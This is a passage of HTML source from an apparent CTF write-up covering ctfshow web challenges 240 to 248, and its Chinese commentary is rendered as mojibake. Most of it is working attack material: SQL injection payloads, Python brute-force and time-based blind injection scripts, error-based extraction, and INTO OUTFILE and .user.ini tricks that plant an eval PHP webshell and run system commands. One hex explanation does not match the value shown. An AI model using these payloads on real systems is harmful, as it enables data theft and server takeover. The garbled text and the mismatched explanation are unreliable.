class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,(select`flag`from`flagbb`));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;0e1b5153-fff7-48be-aca1-cef950d964a0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p>Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a/bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™<br>æ„æ€å°±æ˜¯è®©æˆ‘ä»¬çˆ†ç ´å‘—ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2483863-8c01-4755-a5b3-decf561e6728.challenge.ctf.show/api/insert.php&quot;</span><br><span class="line">name <span class="operator">=</span> &quot;flag&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                    res <span class="operator">=</span> name <span class="operator">+</span> a <span class="operator">+</span> b <span class="operator">+</span> c <span class="operator">+</span> d <span class="operator">+</span> e</span><br><span class="line">                    data <span class="operator">=</span> &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: f&quot;&#123;res&#125;&#x27;,(select(flag)from(&#123;res&#125;)))#&quot;,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    print(data)</span><br><span class="line">                    r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data)</span><br></pre></td></tr></table></figure><p>è·‘å®Œä¸€éä¹‹ååˆ·æ–°ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690546632830-eb02d773-ff79-495a-9e30-5aa8c826e14b.png" alt="image.png"></p><h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>é‡äº‹ä¸å†³ç›´æ¥ä¸Šç›²æ³¨ï¼š<br>ç›®æ ‡ä½ç½®<code>api/delete.php</code><br>å…ˆå†³å®šä¸€ä¸‹æµ‹è¯•payloadï¼Œç›´æ¥åœ¨idä¸­ä¼ å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr((database())),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">0.05</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ—¶é—´ç›²æ³¨ä¸åŒè®¾å¤‡çš„æ—¶é—´ä¸åŒï¼Œæ ¹æ®è‡ªå·±è°ƒæ•´</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span> encoding: utf<span class="number">-8</span> <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span><br><span class="line">@Contact :   2997453446@qq.com</span><br><span class="line">@Blog    :   natro92.github.io</span><br><span class="line"> </span><br><span class="line">@Modify Time      @Author    @Version    @Desciption</span><br><span class="line">------------      -------    --------    -----------</span><br><span class="line">2023/7/28 20:21   natro92      1.0        web241</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> tqdm import trange</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> r<span class="string">&#x27;http://b2100936-f04f-42cf-a179-f6bb35e08972.challenge.ctf.show/api/delete.php&#x27;</span></span><br><span class="line">flag_pre <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str <span class="operator">=</span> &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-,&#125; &quot;</span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;flag&quot;&#x27;</span></span><br><span class="line">inside <span class="operator">=</span> <span class="string">&#x27;substr((select group_concat(flag) from flag),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload <span class="operator">=</span> &quot;if(substr((&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(0.05),0)&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">last</span> <span class="operator">=</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(inside, i, j),</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            # print(data)</span><br><span class="line">            r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data, timeout<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">last</span> <span class="operator">=</span> res</span><br><span class="line">            res <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            # print(res)</span><br><span class="line">            break</span><br><span class="line">        if <span class="keyword">last</span> <span class="operator">=</span><span class="operator">=</span> res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç½‘ç»œçš„å¥½åå†³å®šç€ä½ åœ¨è¿™ä¸ªé€”ä¸­æ˜¯å¦ä¼šå‡ºç°é”™è¯¯ã€‚å°½é‡å‡å°‘ä½æ•°çš„ç›²æ³¨ï¼ŒçŸ¥é“çš„å‰ç¼€å°±åˆ«æ³¨äº†ã€‚</p><h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="å­—æ®µåˆ†éš”ç¬¦"><a href="#å­—æ®µåˆ†éš”ç¬¦" class="headerlink" title="å­—æ®µåˆ†éš”ç¬¦"></a>å­—æ®µåˆ†éš”ç¬¦</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED <span class="keyword">BY</span>â€˜,â€˜å­—æ®µé—´åˆ†å‰²ç¬¦</span><br><span class="line">OPTIONALLY ENCLOSED <span class="keyword">BY</span>â€˜&quot;â€˜å°†å­—æ®µåŒ…å›´ å¯¹æ•°å€¼å‹æ— æ•ˆ</span><br></pre></td></tr></table></figure><p>ç›¸å…³å‚è€ƒï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"> </span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS <span class="operator">|</span> COLUMNS&#125;</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]<span class="operator">/</span><span class="operator">/</span>åˆ†éš”ç¬¦</span><br><span class="line">        [[OPTIONALLY] ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">        [ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************************/</span></span><br><span class="line"></span><br><span class="line">â€œOPTIONâ€å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š</span><br><span class="line"> </span><br><span class="line">`FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦ä¸²&#x27;</span>`ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚</span><br><span class="line"> </span><br><span class="line">`FIELDS ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦&#x27;</span>`ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</span><br><span class="line"> </span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦&#x27;</span>`ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½<span class="type">CHAR</span>ã€<span class="type">VARCHAR</span>å’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚</span><br><span class="line"> </span><br><span class="line">`FIELDS ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦&#x27;</span>`ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚</span><br><span class="line"> </span><br><span class="line">`LINES STARTING <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦ä¸²&#x27;</span>`ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚</span><br><span class="line"> </span><br><span class="line">`LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;å­—ç¬¦ä¸²&#x27;</span>`ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> outfile &quot;ä½ç½®&quot; fileds terminated <span class="keyword">by</span> <span class="string">&#x27;å†™å…¥å†…å®¹&#x27;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶æ¢è¡Œç¬¦ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>å¤‡ä»½è¡¨</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨æµ‹è¯•æœ¨é©¬æ¥å£ä½ç½®<code>/api/dump.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>php<span class="string">&#x27; fields terminated by &#x27;</span><span class="operator">&lt;</span>?php eval($_REQUEST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/dump/1.php</code><br>getæˆ–postä¼ å‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">=</span><span class="keyword">system</span>(<span class="string">&#x27;cat /flag.here&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><h3 id="sqlåŠ æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬"><a href="#sqlåŠ æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬" class="headerlink" title="sqlåŠ æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬"></a>sqlåŠ æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">\nauto_prepend_file<span class="operator">=</span><span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå…ˆä¼ å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>jpg<span class="string">&#x27; LINES TERMINATED BY 0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br></pre></td></tr></table></figure><p>å†ä¼ å…¥<code>.user.ini</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span>.user.ini<span class="string">&#x27; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#</span></span><br><span class="line"><span class="string">å…¶ä¸­0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670Aæ˜¯&lt;?php eval($_REQUEST[1]);?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ï¼š<code>dump/index.php</code><br>ä¼ å…¥å‘½ä»¤å³å¯ã€‚<code>1=system(&#39;cat /flag.here&#39;);</code></p><h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h3 id="æŠ¥é”™æ³¨å…¥-updatexml"><a href="#æŠ¥é”™æ³¨å…¥-updatexml" class="headerlink" title="æŠ¥é”™æ³¨å…¥ updatexml"></a>æŠ¥é”™æ³¨å…¥ updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>å¤‡ä»½è¡¨</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>æ— è¿‡æ»¤</span><br></pre></td></tr></table></figure><p>ç”¨updatexmlæŠ¥é”™æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flag,ctfshow_use</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flag<span class="string">&#x27;)),1) -- A</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flagå¤ªé•¿éœ€è¦æŸ¥ä¸¤éï¼š</span><br><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select mid(flag,1,30) from ctfshow_flag)),1) --+</span></span><br><span class="line"><span class="string">api/?id=&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> mid(flag,<span class="number">20</span>,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flag)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¼èµ·æ¥ï¼š<br>ctfshow{99150aa0-0cf6-4537-ad52-3043e2647334}</p><h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>ç”¨æ³•ç±»ä¼¼ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°äº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)); --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flagsa,ctfshow_</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flagsa<span class="string">&#x27;),0x7e)); --+</span></span><br><span class="line"><span class="string">id,flag1,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select right(flag1,45) from ctfshow_flagsa),0x7e)); --+</span></span><br><span class="line"><span class="string">ctfshow&#123;1eaee386-fce7-49d8-86fd</span></span><br><span class="line"><span class="string">api/?id=1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">right</span>(flag1,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flagsa),<span class="number">0x7e</span>)); <span class="comment">--+</span></span><br><span class="line"><span class="number">6</span><span class="operator">-</span>fce7<span class="number">-49</span>d8<span class="number">-86</span>fd<span class="number">-15</span>c29674ed78&#125;</span><br></pre></td></tr></table></figure><p>ctfshow{1eaee386-fce7-49d8-86fd-15c29674ed78}</p><h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><blockquote><p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p></blockquote><h3 id="flooråŒæŸ¥è¯¢"><a href="#flooråŒæŸ¥è¯¢" class="headerlink" title="flooråŒæŸ¥è¯¢"></a>flooråŒæŸ¥è¯¢</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>æŸ¥è¡¨å</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br><span class="line"><span class="string">//æŸ¥åˆ—å</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flags&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">-- A</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>æŸ¥æ•°æ®</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure><p>éœ€è¦äºŒæ¬¡ä¸Šä¼ æ‰ä¼šå‡ºç°ç»“æœ</p><h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><h3 id="ceilä»£æ›¿floor"><a href="#ceilä»£æ›¿floor" class="headerlink" title="ceilä»£æ›¿floor"></a>ceilä»£æ›¿floor</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ceil()(å‘ä¸Šå–æ•´)ä»£æ›¿floor()ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨round()ï¼š<br>ROUND(X) â€“ è¡¨ç¤ºå°†å€¼ X å››èˆäº”å…¥ä¸ºæ•´æ•°ï¼Œæ— å°æ•°ä½<br>ROUND(X,D) â€“ è¡¨ç¤ºå°†å€¼ X å››èˆäº”å…¥ä¸ºå°æ•°ç‚¹å D ä½çš„æ•°å€¼ï¼ŒDä¸ºå°æ•°ç‚¹åå°æ•°ä½æ•°ã€‚è‹¥è¦ä¿ç•™ X å€¼å°æ•°ç‚¹å·¦è¾¹çš„ D ä½ï¼Œå¯å°† D è®¾ä¸ºè´Ÿå€¼ã€‚<br>æœ€åçš„payloadæ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—æ®µåflag?åŠ äº†åå¼•å·ï¼ŒåŸå› æ˜¯ï¼š<br>è¡¨åå’Œå­—æ®µåéƒ½å¯ä»¥ç”¨åå¼•å·å¼•èµ·æ¥ï¼Œè¿™æ˜¯ç”¨æ¥åŒºåˆ†MYSQLçš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦ã€‚ è¡¨åã€å­—æ®µåã€æ•°æ®åº“åç­‰å¯ç”¨åå¼•å· ( ` )ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨åå¼•å· ï¼Œä½†å¦‚æœå®ƒåŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–ä¿ç•™å­—ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ï¼Œå¦‚æœä¸ä½¿ç”¨å°±ä¼šæŠ¥é”™ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690557907870-84c2d526-6b51-41e6-9887-7731d9ddac80.png" alt="image.png"></p><h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><blockquote><p><a href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/</a><br><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83</a><br><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br><a href="https://blog.csdn.net/qq_35938621/article/details/119846053">https://blog.csdn.net/qq_35938621/article/details/119846053</a> è¿™é‡Œè®²äº†è¯¦ç»†æ­¥éª¤ å»ºè®®çœ‹çœ‹</p></blockquote><p>UDFæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼ŒUDFï¼ˆUserdefined 